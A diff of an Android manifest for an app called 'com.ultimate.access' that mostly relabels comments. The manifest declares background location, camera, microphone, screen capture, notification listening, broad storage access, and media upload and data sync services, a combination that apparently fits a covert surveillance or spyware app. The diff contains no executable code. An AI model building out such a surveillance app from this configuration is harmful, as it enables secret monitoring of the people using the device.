@@ -3,32 +3,32 @@
     xmlns:tools="http://schemas.android.com/tools"
     package="com.ultimate.access">
 
-    <!-- INTERNET -->
+    <!-- ============= PERMISSIONS ============= -->
+
+    <!-- INTERNET & NETWORK -->
     <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
 
-    <!-- ✅ WIFI STATE (MISSING THA) -->
-    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
-    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
-
-    <!-- STORAGE -->
+    <!-- STORAGE (Android 13+) -->
     <uses-permission android:name="android.permission.READ_MEDIA_IMAGES"/>
     <uses-permission android:name="android.permission.READ_MEDIA_VIDEO"/>
     <uses-permission android:name="android.permission.READ_MEDIA_AUDIO"/>
 
+    <!-- STORAGE (Old versions) -->
     <uses-permission
         android:name="android.permission.WRITE_EXTERNAL_STORAGE"
         android:maxSdkVersion="32"/>
-
     <uses-permission
         android:name="android.permission.MANAGE_EXTERNAL_STORAGE"
         tools:ignore="ScopedStorage"/>
 
-    <!-- LOCATION -->
+    <!-- LOCATION (High Accuracy) -->
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
     <uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>
 
-    <!-- CAMERA & AUDIO -->
+    <!-- CAMERA & MICROPHONE -->
     <uses-permission android:name="android.permission.CAMERA"/>
     <uses-permission android:name="android.permission.RECORD_AUDIO"/>
 
@@ -70,12 +70,10 @@
             android:exported="true"
             android:launchMode="singleTask"
             android:screenOrientation="portrait">
-
             <intent-filter>
                 <action android:name="android.intent.action.MAIN"/>
                 <category android:name="android.intent.category.LAUNCHER"/>
             </intent-filter>
-
         </activity>
 
         <!-- PERMISSION MANAGER -->
@@ -84,12 +82,12 @@
             android:exported="true"
             android:theme="@style/Theme.AppCompat.Translucent"/>
 
-        <!-- SERVER STATUS -->
+        <!-- SERVER SYNC ACTIVITY -->
         <activity
             android:name=".ServerSyncActivity"
             android:exported="false"/>
 
-        <!-- DATA SYNC -->
+        <!-- DATA SYNC SERVICE -->
         <service
             android:name=".network.DataSyncService"
             android:enabled="true"
@@ -103,29 +101,27 @@
             android:exported="false"
             android:foregroundServiceType="camera|microphone|location|dataSync"/>
 
-        <!-- SCREEN CAPTURE -->
+        <!-- SCREEN CAPTURE SERVICE -->
         <service
             android:name=".services.ScreenCaptureService"
             android:enabled="true"
             android:exported="false"
             android:foregroundServiceType="mediaProjection"/>
 
-        <!-- MEDIA UPLOAD -->
+        <!-- MEDIA UPLOAD SERVICE -->
         <service
             android:name=".services.MediaUploadService"
             android:enabled="true"
             android:exported="false"/>
 
-        <!-- NOTIFICATION LISTENER -->
+        <!-- NOTIFICATION LISTENER SERVICE -->
         <service
             android:name=".services.NotificationListener"
             android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
             android:exported="true">
-
             <intent-filter>
                 <action android:name="android.service.notification.NotificationListenerService"/>
             </intent-filter>
-
         </service>
 
     </application>
